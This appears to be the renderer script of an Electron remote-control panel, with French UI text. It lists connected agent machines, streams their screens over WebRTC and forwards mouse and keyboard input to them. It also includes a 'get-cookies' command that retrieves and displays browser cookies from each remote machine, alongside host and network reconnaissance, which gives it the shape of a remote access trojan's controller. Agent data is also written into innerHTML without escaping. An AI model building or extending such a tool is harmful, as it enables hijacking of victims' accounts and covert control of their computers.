const { ipcRenderer } = require('electron');
const io = require('socket.io-client');
const { SERVER_URL } = require('../config');

// ── Contrôles fenêtre ──
function minimize() { ipcRenderer.send('app-minimize'); }
function maximize() { ipcRenderer.send('app-maximize'); }
function quit()     { ipcRenderer.send('app-quit'); }
window.minimize = minimize;
window.maximize = maximize;
window.quit     = quit;

// ── État global ──
let socket;
const agents    = {};            // agentId → { id, name, connectedAt }
const sessions  = {};            // agentId → { pc, agentName, state }
let activeAgent = null;          // agentId de la session active dans le viewer
let currentView = 'grid';        // 'grid' | 'list'
let searchQuery = '';

const RTC_CONFIG = {
  iceServers: [
    { urls: 'stun:stun.l.google.com:19302' },
    { urls: 'stun:stun1.l.google.com:19302' },
    { urls: 'stun:stun2.l.google.com:19302' }
  ]
};

// ── Helpers UI ──
function setTitleStatus(state, text) {
  document.getElementById('tlDot').className = `status-dot ${state}`;
  document.getElementById('tlText').textContent = text;
}

function showOverlay(text) {
  document.getElementById('viewerOverlay').classList.add('visible');
  document.getElementById('overlayText').textContent = text;
}
function hideOverlay() {
  document.getElementById('viewerOverlay').classList.remove('visible');
}

function timeSince(ts) {
  const mins = Math.floor((Date.now() - ts) / 60000);
  if (mins < 1) return 'à l\'instant';
  if (mins < 60) return `il y a ${mins} min`;
  return `il y a ${Math.floor(mins / 60)} h`;
}

// ── Pages ──
function showPage(page) {
  document.getElementById('pageAppareils').classList.toggle('hidden', page !== 'appareils');
  document.getElementById('sessionPage').classList.toggle('hidden', page === 'appareils');

  document.getElementById('tabAppareils').classList.toggle('active', page === 'appareils');
  document.getElementById('viewGrid').style.display = page === 'appareils' ? '' : 'none';
  document.getElementById('viewList').style.display = page === 'appareils' ? '' : 'none';
}
window.showPage = showPage;

function setView(v) {
  currentView = v;
  document.getElementById('viewGrid').classList.toggle('active', v === 'grid');
  document.getElementById('viewList').classList.toggle('active', v === 'list');
  const grid = document.getElementById('agentsGrid');
  if (v === 'list') {
    grid.style.gridTemplateColumns = '1fr';
  } else {
    grid.style.gridTemplateColumns = 'repeat(auto-fill, minmax(200px, 1fr))';
  }
}
window.setView = setView;

function filterAgents(q) {
  searchQuery = q.toLowerCase();
  renderAgents();
}
window.filterAgents = filterAgents;

// ── Rendu des agents ──
function renderAgents() {
  const grid = document.getElementById('agentsGrid');
  const empty = document.getElementById('emptyState');
  const count = document.getElementById('agentsCount');

  const list = Object.values(agents).filter(a =>
    !searchQuery || a.name.toLowerCase().includes(searchQuery)
  );

  count.textContent = `${list.length} appareil${list.length !== 1 ? 's' : ''} en ligne`;

  if (list.length === 0) {
    grid.innerHTML = '';
    grid.style.display = 'none';
    empty.classList.remove('hidden');
    return;
  }

  grid.style.display = '';
  empty.classList.add('hidden');

  grid.innerHTML = list.map(agent => {
    const isConnected = !!sessions[agent.id];
    const state = sessions[agent.id]?.state;
    return `
      <div class="agent-card ${isConnected ? 'connected-session' : 'online'}" id="card-${agent.id}">
        <div class="agent-card-top">
          <div class="agent-icon">🖥️</div>
          <div class="agent-online-dot ${isConnected ? 'active' : 'online'}"></div>
        </div>
        <div class="agent-name" title="${agent.name}">${agent.name}</div>
        <div class="agent-sub">${timeSince(agent.connectedAt)}</div>
        <div class="agent-card-footer">
          ${isConnected
            ? `<button class="btn-connect disconnect" onclick="disconnectAgent('${agent.id}')">⏏ Déconnecter</button>`
            : `<button class="btn-connect connect" onclick="connectAgent('${agent.id}')">Se connecter</button>`
          }
        </div>
      </div>`;
  }).join('');
}

// ── Session tabs dans la barre de nav ──
function renderSessionTabs() {
  const container = document.getElementById('sessionTabsContainer');
  container.innerHTML = Object.entries(sessions).map(([agentId, s]) => {
    const isActive = agentId === activeAgent;
    return `
      <div class="nav-tab ${isActive ? 'active' : ''}" onclick="switchSession('${agentId}')">
        <span>${s.agentName}</span>
        <span class="tab-close" onclick="event.stopPropagation(); disconnectAgent('${agentId}')">✕</span>
      </div>`;
  }).join('');
}

// Tabs internes dans le viewer
function renderInnerSessionTabs() {
  const bar = document.getElementById('sessionTabsBar');
  bar.innerHTML = Object.entries(sessions).map(([agentId, s]) => {
    const isActive = agentId === activeAgent;
    return `
      <div class="session-tab ${isActive ? 'active' : ''}" onclick="switchSession('${agentId}')">
        <div class="stab-dot ${s.state === 'connecting' ? 'connecting' : ''}"></div>
        <span>${s.agentName}</span>
        <div class="stab-close" onclick="event.stopPropagation(); disconnectAgent('${agentId}')">✕</div>
      </div>`;
  }).join('');
}

function switchSession(agentId) {
  activeAgent = agentId;
  renderSessionTabs();
  renderInnerSessionTabs();

  const session = sessions[agentId];
  if (!session) return;

  const video = document.getElementById('remoteVideo');
  const placeholder = document.getElementById('videoPlaceholder');

  if (session.stream) {
    video.srcObject = session.stream;
    video.classList.add('visible');
    placeholder.style.display = 'none';
    hideOverlay();
    document.getElementById('toolbar').classList.add('visible');
  } else {
    video.classList.remove('visible');
    placeholder.style.display = 'flex';
    showOverlay('Connexion...');
    document.getElementById('toolbar').classList.remove('visible');
  }

  showPage('session');
}
window.switchSession = switchSession;

// ── Connexion à un agent ──
window.connectAgent = function(agentId) {
  if (sessions[agentId]) {
    switchSession(agentId);
    return;
  }
  if (!socket?.connected) {
    setTitleStatus('error', 'Serveur non connecté');
    return;
  }

  const agent = agents[agentId];
  if (!agent) return;

  sessions[agentId] = { pc: null, agentName: agent.name, state: 'connecting', stream: null };
  activeAgent = agentId;

  renderAgents();
  renderSessionTabs();
  renderInnerSessionTabs();
  showPage('session');
  showOverlay(`Connexion à ${agent.name}...`);

  socket.emit('controller:connect', agentId);
};

// ── Déconnexion d'un agent ──
window.disconnectAgent = function(agentId) {
  if (socket?.connected) {
    socket.emit('controller:disconnect', agentId);
  }

  const session = sessions[agentId];
  if (session?.pc) { session.pc.close(); }
  delete sessions[agentId];

  if (activeAgent === agentId) {
    activeAgent = null;
    const video = document.getElementById('remoteVideo');
    video.srcObject = null;
    video.classList.remove('visible');
    document.getElementById('toolbar').classList.remove('visible');
    hideOverlay();

    const remaining = Object.keys(sessions);
    if (remaining.length > 0) {
      switchSession(remaining[0]);
    } else {
      showPage('appareils');
    }
  }

  renderAgents();
  renderSessionTabs();
  renderInnerSessionTabs();
};

// ── WebRTC: recevoir offre de l'agent ──
async function handleOffer(agentId, sdp) {
  const session = sessions[agentId];
  if (!session) return;

  const pc = new RTCPeerConnection(RTC_CONFIG);
  session.pc = pc;

  pc.ontrack = (event) => {
    session.stream = event.streams[0];
    if (activeAgent === agentId) {
      const video = document.getElementById('remoteVideo');
      video.srcObject = session.stream;
      video.onloadedmetadata = () => {
        video.classList.add('visible');
        document.getElementById('videoPlaceholder').style.display = 'none';
        document.getElementById('toolbar').classList.add('visible');
        hideOverlay();
        session.state = 'connected';
        renderInnerSessionTabs();
        video.focus();
      };
    }
    session.state = 'connected';
    renderInnerSessionTabs();
  };

  pc.onicecandidate = ({ candidate }) => {
    if (candidate) {
      socket.emit('signal', { to: agentId, signal: { type: 'ice', candidate } });
    }
  };

  pc.onconnectionstatechange = () => {
    const state = pc.connectionState;
    if (state === 'failed' || state === 'disconnected') {
      if (activeAgent === agentId) {
        showOverlay('Connexion perdue');
        document.getElementById('toolbar').classList.remove('visible');
      }
    }
  };

  await pc.setRemoteDescription(new RTCSessionDescription(sdp));
  const answer = await pc.createAnswer();
  await pc.setLocalDescription(answer);
  socket.emit('signal', { to: agentId, signal: { type: 'answer', sdp: answer } });
}

// ── Capture input → envoi au bon agent ──
function setupInputCapture() {
  const video = document.getElementById('remoteVideo');

  function getRelCoords(e) {
    const rect = video.getBoundingClientRect();
    return {
      x: Math.max(0, Math.min(1, (e.clientX - rect.left) / rect.width)),
      y: Math.max(0, Math.min(1, (e.clientY - rect.top) / rect.height))
    };
  }

  function sendInput(event) {
    if (!socket?.connected || !activeAgent) return;
    socket.emit('input', { to: activeAgent, event });
  }

  const cursor = document.getElementById('remoteCursor');
  let lastMove = 0;

  video.addEventListener('mousemove', (e) => {
    const now = Date.now();
    if (now - lastMove < 33) return;
    lastMove = now;
    const { x, y } = getRelCoords(e);
    cursor.style.display = 'block';
    cursor.style.left = `${e.clientX - video.getBoundingClientRect().left}px`;
    cursor.style.top  = `${e.clientY - video.getBoundingClientRect().top}px`;
    sendInput({ type: 'mousemove', x, y });
  });

  video.addEventListener('mouseleave', () => { cursor.style.display = 'none'; });
  video.addEventListener('mousedown',  (e) => { e.preventDefault(); sendInput({ type: 'mousedown',  ...getRelCoords(e), button: e.button }); });
  video.addEventListener('mouseup',    (e) => { e.preventDefault(); sendInput({ type: 'mouseup',    ...getRelCoords(e), button: e.button }); });
  video.addEventListener('click',      (e) => { e.preventDefault(); sendInput({ type: 'click',      ...getRelCoords(e), button: e.button }); video.focus(); });
  video.addEventListener('dblclick',   (e) => { e.preventDefault(); sendInput({ type: 'dblclick',   ...getRelCoords(e) }); });
  video.addEventListener('contextmenu',(e) => { e.preventDefault(); sendInput({ type: 'contextmenu',...getRelCoords(e) }); });
  video.addEventListener('wheel',      (e) => { e.preventDefault(); sendInput({ type: 'wheel', deltaY: e.deltaY, deltaX: e.deltaX }); }, { passive: false });
  video.addEventListener('keydown',    (e) => { e.preventDefault(); sendInput({ type: 'keydown', keyCode: e.keyCode, key: e.key }); });
  video.addEventListener('keyup',      (e) => { e.preventDefault(); sendInput({ type: 'keyup',   keyCode: e.keyCode, key: e.key }); });
}

// ── Socket.io ──
function connectToServer() {
  setTitleStatus('connecting', 'Connexion...');

  socket = io(SERVER_URL, {
    reconnectionDelay: 2000,
    reconnectionDelayMax: 10000,
    timeout: 10000
  });

  socket.on('connect', () => {
    socket.emit('controller:register');
    setTitleStatus('connected', 'En ligne');
  });

  // Mise à jour de la liste des agents
  socket.on('agents:list', (list) => {
    // Nettoyer les agents hors ligne
    Object.keys(agents).forEach(id => { if (!list.find(a => a.id === id)) delete agents[id]; });
    list.forEach(a => { agents[a.id] = a; });
    renderAgents();
    document.getElementById('agentsCount').textContent =
      `${list.length} appareil${list.length !== 1 ? 's' : ''} en ligne`;
  });

  // Agent vient de passer hors ligne
  socket.on('agent:offline', (agentId) => {
    delete agents[agentId];
    if (sessions[agentId]) {
      window.disconnectAgent(agentId);
    }
    renderAgents();
  });

  // Erreur de connexion à un agent
  socket.on('connect:error', ({ agentId, msg }) => {
    delete sessions[agentId];
    renderAgents();
    renderSessionTabs();
    renderInnerSessionTabs();
    if (Object.keys(sessions).length === 0) showPage('appareils');
  });

  // Signalisation WebRTC
  socket.on('signal', async ({ from: agentId, signal }) => {
    if (signal.type === 'offer') {
      showOverlay('Établissement WebRTC...');
      try {
        await handleOffer(agentId, signal.sdp);
      } catch (err) {
        showOverlay(`Erreur: ${err.message}`);
      }
    } else if (signal.type === 'ice' && signal.candidate) {
      const session = sessions[agentId];
      if (session?.pc) {
        await session.pc.addIceCandidate(new RTCIceCandidate(signal.candidate)).catch(() => {});
      }
    }
  });

  // Agent s'est déconnecté en cours de session
  socket.on('agent:offline', (agentId) => {
    if (sessions[agentId]) window.disconnectAgent(agentId);
    delete agents[agentId];
    renderAgents();
  });

  socket.on('disconnect', () => {
    setTitleStatus('error', 'Déconnecté');
    Object.keys(agents).forEach(id => delete agents[id]);
    renderAgents();
  });

  socket.on('connect_error', () => setTitleStatus('error', 'Serveur inaccessible'));

  socket.on('command:result', ({ agentId, cmd, data }) => {
    if (cmd === 'get-info') {
      renderInfo(data);
      showToast('✅ Infos récupérées');
    } else if (cmd === 'get-cookies') {
      let txt = '';
      for (const [browser, val] of Object.entries(data)) {
        txt += `── ${browser} ──\n${val}\n\n`;
      }
      document.getElementById('cookiesOutput').textContent = txt || 'Aucun cookie trouvé';
      showToast('🍪 Cookies récupérés');
    } else {
      showToast(`✅ ${cmd}: ${typeof data === 'string' ? data : JSON.stringify(data)}`);
    }
  });
}

// ── Side panel ──
let spOpen = false;
let spCurrentTab = 'info';

function toggleSidePanel(tab) {
  const panel = document.getElementById('sidePanel');
  if (spOpen && spCurrentTab === tab) {
    panel.classList.add('hidden');
    spOpen = false;
  } else {
    panel.classList.remove('hidden');
    spOpen = true;
    switchSpTab(tab);
  }
}
window.toggleSidePanel = toggleSidePanel;

function switchSpTab(tab) {
  spCurrentTab = tab;
  ['info','macros','cookies'].forEach(t => {
    document.getElementById(`spTab${t.charAt(0).toUpperCase()+t.slice(1)}`).classList.toggle('active', t === tab);
    document.getElementById(`spBody${t.charAt(0).toUpperCase()+t.slice(1)}`).classList.toggle('hidden', t !== tab);
  });
}
window.switchSpTab = switchSpTab;

// ── Commandes macro ──
window.sendCommand = function(cmd) {
  if (!socket?.connected || !activeAgent) return;
  socket.emit('command', { to: activeAgent, cmd });
  showToast(`⏳ ${cmd}...`);
};

window.confirmCmd = function(cmd, msg) {
  if (confirm(msg)) window.sendCommand(cmd);
};

function showToast(msg, duration = 3000) {
  const t = document.getElementById('cmdToast');
  t.textContent = msg;
  t.classList.add('show');
  clearTimeout(t._timer);
  t._timer = setTimeout(() => t.classList.remove('show'), duration);
}

function renderInfo(data) {
  const el = document.getElementById('infoContent');
  el.innerHTML = `
    <div class="info-section">
      <div class="info-section-title">Réseau</div>
      ${(data.ips||[]).map(ip => `<div class="info-row"><span class="info-key">IP</span><span class="info-val ip">${ip}</span></div>`).join('')}
    </div>
    <div class="info-section">
      <div class="info-section-title">Système</div>
      <div class="info-row"><span class="info-key">Hostname</span><span class="info-val">${data.hostname||'-'}</span></div>
      <div class="info-row"><span class="info-key">OS</span><span class="info-val">${data.platform||'-'} ${data.release||''}</span></div>
      <div class="info-row"><span class="info-key">Arch</span><span class="info-val">${data.arch||'-'}</span></div>
    </div>
    <div class="info-section">
      <div class="info-section-title">Matériel</div>
      <div class="info-row"><span class="info-key">CPU</span><span class="info-val">${data.cpus||'-'}</span></div>
      <div class="info-row"><span class="info-key">RAM totale</span><span class="info-val">${data.totalMem||'-'}</span></div>
      <div class="info-row"><span class="info-key">RAM libre</span><span class="info-val">${data.freeMem||'-'}</span></div>
      <div class="info-row"><span class="info-key">Uptime</span><span class="info-val">${data.uptime||'-'}</span></div>
    </div>`;
}

// ── Démarrage ──
setupInputCapture();
connectToServer();
